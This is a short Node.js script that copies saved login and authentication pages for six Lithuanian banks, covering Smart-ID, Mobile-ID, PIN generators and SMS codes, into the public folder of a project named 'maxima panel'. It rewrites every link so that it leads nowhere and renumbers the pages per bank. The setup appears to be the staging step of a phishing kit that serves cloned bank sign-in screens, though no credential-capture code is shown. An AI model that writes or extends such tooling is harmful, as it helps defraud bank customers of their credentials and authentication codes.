const fs = require('fs');
const path = require('path');
const srcDir = 'C:\\Users\\XENOTIC\\Desktop\\LT BANK';
const destDir = 'C:\\Users\\XENOTIC\\Desktop\\maxima panel\\public\\lithuanian-banks';

if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });

const bankMapping = {
  'Sweed LT': { slug: 'swedbank-lt', files: ['Swedbank Smart-ID.html', 'Swedbank Mobile-ID.html', 'Swedbank BiometrikaPIN.html', 'Swedbank PIN generatorius.html', 'Swedbank ID-kortelė.html'] },
  'SEB LT': { slug: 'seb-lt', files: ['SEB Login Smart-ID.html', 'SEB Login Mobile-ID.html', 'SEB Login SEB programėlė.html', 'SEB Login Generatorius.html'] },
  'Luminor LT': { slug: 'luminor-lt', files: ['Luminor SMART-ID.html', 'Luminor M. paraša.html', 'Luminor Generatorius.html'] },
  'citadele LT': { slug: 'citadele-lt', files: ['Citadele Mobile-ID.html', 'Citadele MobileSCANDigipass 780.html', 'Citadele Kodų kortelėGeneratorius.html'] },
  'LKU LT': { slug: 'lku-lt', files: ['LKU Smart-ID.html', 'LKU Mobile-ID.html', 'LKU Vienkartinis saugos kodas.html'] },
  'ARTEA LT': { slug: 'siauliu-lt', files: ['Artea SMART-ID.html', 'Artea Mobile-ID.html', 'Artea BiometrikaPIN.html', 'Artea SMS.html'] }
};

for (const [folder, data] of Object.entries(bankMapping)) {
  const bankSrcDir = path.join(srcDir, folder);
  const bankDestDir = path.join(destDir, data.slug);
  if (!fs.existsSync(bankDestDir)) fs.mkdirSync(bankDestDir, { recursive: true });
  
  data.files.forEach((file, index) => {
    const srcPath = path.join(bankSrcDir, file);
    if (fs.existsSync(srcPath)) {
      let content = fs.readFileSync(srcPath, 'utf8');
      
      // Remove external links
      content = content.replace(/href="[^"]*"/g, 'href="javascript:void(0)"');
      content = content.replace(/href='[^']*'/g, 'href="javascript:void(0)"');
      content = content.replace(/target="_blank"/g, '');
      
      const destPath = path.join(bankDestDir, (index + 1) + '.html');
      fs.writeFileSync(destPath, content);
      console.log('Processed:', file, '->', data.slug + '/' + (index + 1) + '.html');
    } else {
      console.log('NOT FOUND:', srcPath);
    }
  });
}
